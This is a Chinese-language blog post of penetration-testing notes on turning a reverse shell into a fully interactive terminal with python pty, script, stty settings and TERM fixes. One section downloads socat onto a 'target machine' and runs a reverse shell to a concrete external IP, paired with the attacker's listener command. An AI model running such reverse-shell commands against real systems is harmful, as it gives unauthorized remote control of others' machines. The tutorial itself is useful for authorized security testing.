---
layout: post
toc: true
title: "「BASH」:谈谈完全交互式的终端"
author: Bin4xin
categories:
    - blog
tags:
    - BASH
    - 笔记
permalink: /blog/2020/get/TTY/terminal/
---

写在前面，本方法适用于在反弹shell后把shell提升为完全交互式shell，也是自己实战了一段时间后摸索出来的，记一下笔记；
# 完美的交互式shell
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo
fg
reset
export SHELL=bash
//$ export TERM=xterm-256color
```

同样的，我在网上也找到另外一种方式：`script /dev/null/`这样：同理，也可以通过同样的方式获取到交互式shell：
```bash
script /dev/null
Ctrl-Z
stty raw -echo
fg
reset
```
这样我们在终端某个命令时，输入`ctrl+c`或者`ctrl+z`就不会直接中断shell。
这里转载搜到信息来进行展示，供大家参考：
```bash
stty -echo	#禁止回显，当在键盘上输入时，并不出现在屏幕上
stty echo 	#打开回显
stty raw 	#设置原始输入
stty -raw	#关闭原始输入
bg			#将一个在后台暂停的命令，变成继续执行
fg			#将后台中的命令调至前台继续运行
jobs		#查看当前有多少在后台运行的命令
ctrl+z 		#可以将一个正在前台执行的命令放到后台，并且暂停
clear  		#这个命令将会刷新屏幕，本质上只是让终端显示页向后翻了一页，如果向上滚动屏幕还可以看到之前的操作信息。
reset 		#这个命令将完全刷新终端屏幕，之前的终端输入操作信息将都会被清空
```
来源：<a href="https://saucer-man.com/information_security/233.html#cl-3">实现交互式shell的几种方式</a>

# socat

目标机

把socat上传到目标机器上或者直接下载
```bash
$ wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat

vuln_ip:
chmod +x /tmp/socat
./tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:47.52.233.92:4444
--
attack machine
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

# stty行列数:)
有的时候终端写入的命令太长，而终端行列不够长来显示所以会导致命令重叠、错杂，我们可以用下面的方法来让我们用这个shell用的更舒服点；

先看看自己机器上的stty配置信息:
```bash
root@ubuntu20-free:~# stty -a
speed 9600 baud; rows 35; columns 148; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R;
werase = ^W; lnext = ^V; discard = ^O; min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel -iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc
```
`speed 9600 baud; rows 35; columns 148; line = 0;`这一段是我们所需要的信息；
```bash
rows 35; columns 148
配置我们的shell如下：
$ stty rows 35 cols 148
```

# 其他痛点
有的时候感觉terminal上太多命令了，用着用着会习惯性输入命令`clear`，然后你们就会看到如下现象：
```bash
# clear

TERM environment variable not set.

# set |grep TERM

TERM=dumb
```
如上，看term的配置信息，最后解决办法如下，设置term为`xterm`就可以了。
```bash
# export TERM=xterm

# set |grep TERM
TERM=xterm
_=TERM
```
之后就可以随意的clear清除命令辣！